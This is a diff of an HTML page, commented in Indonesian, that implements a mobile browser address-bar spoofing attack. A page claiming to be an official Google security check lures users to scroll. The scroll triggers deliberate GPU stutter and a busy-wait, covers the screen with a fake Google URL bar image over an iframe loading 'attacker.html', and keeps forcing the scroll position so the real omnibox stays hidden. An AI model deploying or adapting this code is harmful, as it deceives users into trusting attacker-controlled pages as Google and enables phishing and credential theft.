@@ -2,141 +2,98 @@
 <html lang="en">
   <head>
     <meta charset="UTF-8" />
-    <meta
-      name="viewport"
-      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover"
-    />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover" />
     <title>azzzab</title>
     <style>
-      body,
-      html {
-        margin: 0;
-        padding: 0;
-        width: 100%;
-        height: 300vh; /* Kita bikin lebih panjang biar scroll-nya dapet */
-        background-color: #f8f9fa;
-        font-family: sans-serif;
-        overflow-x: hidden;
-        /* KUNCI: Matikan efek membal di bawah */
-        overscroll-behavior-y: none !important;
+      html, body {
+        margin: 0; padding: 0; width: 100%; height: 250vh; 
+        background-color: #f8f9fa; overflow-x: hidden;
+        overscroll-behavior-y: none !important; /* MATIKAN ELASTIC BOUNCE */
+      }
+
+      /* Kunci layar biar gak bisa ditarik pas spoofing aktif */
+      .lock-all {
+        height: 100vh !important;
+        overflow: hidden !important;
+        touch-action: none !important;
       }
 
       #scroll-bait {
-        display: flex;
-        flex-direction: column;
-        align-items: center;
-        justify-content: center;
-        height: 100vh;
-        text-align: center;
-        color: #5f6368;
-        padding: 20px;
+        display: flex; flex-direction: column; align-items: center;
+        justify-content: center; height: 100vh; text-align: center;
       }
 
       #fake-ui {
-        display: none;
-        position: fixed;
-        top: 0;
-        left: 0;
-        width: 100vw;
-        height: 100vh;
-        z-index: 99999;
-        background: #fff;
-        touch-action: none; /* Matikan interaksi default di level UI */
+        display: none; position: fixed; top: 0; left: 0;
+        width: 100vw; height: 100vh; z-index: 99999; background: #fff;
       }
 
       #fake-bar {
         position: absolute;
-        bottom: 0; /* Tetap di bawah karena target kita address bar bawah */
-        left: 0;
-        width: 100%;
-        height: 56px;
-        object-fit: contain;
-        border-top: 1px solid #ddd; /* Garis di atas karena bar di bawah */
-        z-index: 100;
-        opacity: 0;
-        pointer-events: auto;
-        -webkit-user-drag: none;
-        touch-action: none;
+        bottom: 0; /* Target: Omnibox Bawah */
+        left: 0; width: 100%; height: 56px;
+        object-fit: contain; border-top: 1px solid #ddd;
+        z-index: 100; opacity: 0; pointer-events: none;
       }
 
       #fake-content {
-        position: absolute;
-        top: 0;
-        left: 0;
-        width: 100%;
-        height: calc(100vh - 56px); /* Iframe berhenti sebelum bar bawah */
-        border: none;
-        z-index: 1;
+        position: absolute; top: 0; left: 0;
+        width: 100%; height: calc(100vh - 56px); border: none;
       }
 
-      #gpu-killer {
-        position: fixed;
-        top: 0;
-        left: 0;
-        width: 1px;
-        height: 1px;
-        pointer-events: none;
-        z-index: 1;
+      /* GPU Killer Versi Ringan: Biar gak nge-lag parah */
+      #gpu-lite {
+        position: fixed; top: 0; left: 0; width: 1px; height: 1px;
+        pointer-events: none; z-index: 1;
       }
     </style>
   </head>
   <body>
+
     <div id="scroll-bait">
-      <h2>
-        This is the official Google domain.<br>
-        Please scroll down to verify your session.
-      </h2>
-      <div style="font-size: 50px; color: #1a73e8; margin-top: 30px">↓</div>
+      <h2>Google Security Check</h2>
+      <p>Scroll down slowly to verify.</p>
+      <div style="font-size: 50px; color: #1a73e8;">↓</div>
     </div>
 
-    <div id="gpu-killer"></div>
+    <div id="gpu-lite"></div>
 
     <div id="fake-ui">
-      <img id="fake-bar" src="urlbar-google.jpg" alt="Google Address Bar" />
+      <img id="fake-bar" src="urlbar-google.jpg" />
       <iframe id="fake-content" src="attacker.html"></iframe>
     </div>
 
     <script>
       let isSpoofed = false;
 
-      function triggerMeltdown() {
-        const killerContainer = document.getElementById("gpu-killer");
-        for (let i = 0; i < 2000; i++) {
+      // Versi Ringan: 300 div aja udah cukup buat bikin stutter di Android
+      function lightStutter() {
+        const killer = document.getElementById("gpu-lite");
+        for (let i = 0; i < 300; i++) {
           let div = document.createElement("div");
-          div.style.cssText = `position:absolute; width:100vw; height:10vh; backdrop-filter:blur(10px); opacity:0.01;`;
-          killerContainer.appendChild(div);
+          div.style.cssText = `position:absolute; width:100vw; height:2vh; backdrop-filter:blur(5px); opacity:0.01;`;
+          killer.appendChild(div);
         }
+        // Busy-wait dikurangi jadi 200ms biar gak ANR (Application Not Responding)
         let start = Date.now();
-        while (Date.now() - start < 400) {} 
+        while (Date.now() - start < 200) {} 
       }
 
       window.addEventListener("scroll", () => {
-          // Trigger pas user scroll down
-          if (window.scrollY > 80 && !isSpoofed) {
+          if (window.scrollY > 50 && !isSpoofed) {
             isSpoofed = true;
-            document.getElementById("fake-ui").style.display = "block";
-            triggerMeltdown();
             
-            // KUNCI: Pindah ke koordinat aman agar bar asli ngumpet
-            window.scrollTo(0, 50);
-          }
-          
-          // ANTI-MENTOK LOGIC (The Safety Buffer)
-          if (isSpoofed) {
-              const scrollPos = window.pageYOffset || document.documentElement.scrollTop;
-              const windowHeight = window.innerHeight;
-              const bodyHeight = document.documentElement.scrollHeight;
+            lightStutter();
+            
+            document.getElementById("fake-ui").style.display = "block";
+            document.body.classList.add('lock-all'); // PASANG GEMBOK CSS
 
-              // Kalau jempol user narik sampai mau mentok bawah (danger zone buat bar bawah)
-              if (scrollPos + windowHeight >= bodyHeight - 2) {
-                  // Tendang balik ke atas 5 pixel secara instan
-                  window.scrollTo(0, bodyHeight - windowHeight - 5);
-              }
-              
-              // Kalau coba ditarik ke paling atas (danger zone buat bar atas)
-              if (scrollPos <= 2) {
-                  window.scrollTo(0, 5);
-              }
+            // Tendang ke koordinat tengah agar Omnibox asli ngumpet
+            window.scrollTo(0, 50);
+
+            setTimeout(() => {
+              document.getElementById("gpu-lite").innerHTML = "";
+            }, 500);
           }
       }, { passive: false });
 
@@ -145,23 +102,25 @@
           let fakeBar = document.getElementById("fake-bar");
           fakeBar.style.opacity = "1";
           
-          // RE-ANCHOR: Pastikan kita stay di zona tengah terus
+          // RE-ANCHOR: Tiap kali user nyoba narik mentok, tendang balik!
           setInterval(() => {
-              if(isSpoofed) {
-                  // Cek kalau posisi melenceng dari zona aman, balikin!
-                  if (window.scrollY < 10) window.scrollTo(0, 20);
+            if(isSpoofed) {
+              const pos = window.scrollY;
+              // Kalau mau mentok atas atau mentok bawah (Bottom Bar Danger Zone)
+              if (pos < 5 || pos > 80) {
+                  window.scrollTo(0, 40);
               }
-          }, 50);
+            }
+          }, 30);
         }
       });
 
-      // BLOKIR INTERAKSI PADA FAKE BAR
+      // Blokir total input di gambar palsu
       const fb = document.getElementById("fake-bar");
       ['touchstart', 'touchmove', 'touchend'].forEach(evt => {
-        fb.addEventListener(evt, (e) => {
-            if (isSpoofed) e.preventDefault();
-        }, { passive: false });
+          fb.addEventListener(evt, (e) => e.preventDefault(), { passive: false });
       });
+
     </script>
   </body>
 </html>
